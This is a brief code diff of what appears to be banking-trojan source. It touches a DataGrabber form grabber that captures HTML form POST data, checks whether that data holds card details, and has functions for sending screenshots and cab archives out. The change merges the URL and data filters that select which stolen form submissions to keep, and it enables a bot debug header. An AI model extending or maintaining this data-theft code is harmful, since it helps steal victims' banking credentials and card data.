@@ -19,7 +19,7 @@
 
 //-----------------------------------------------------------------------------
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace LDBGTEMPLATES
 {
@@ -1225,7 +1225,8 @@ bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
 //	DataGrabber::SendCab(Bank->FilePath, "BSS", NULL);
 //
 //	return 0;
-//}
+//}
+
 
 /* DWORD WINAPI SendBSSInist( LPVOID lpData )
 {
@@ -1739,12 +1740,9 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 	#ifdef FgrFiltersH
 		if (!ContainCard)
 		{
-			if (!FiltrateFormGrabberURL(URL))
+			if (!FiltratePostData(URL, Data))
 				return false;
-
-			if (!FiltrateFormGrabberData(Data))
-				return false;
-        }
+		}
 	#endif
 
 
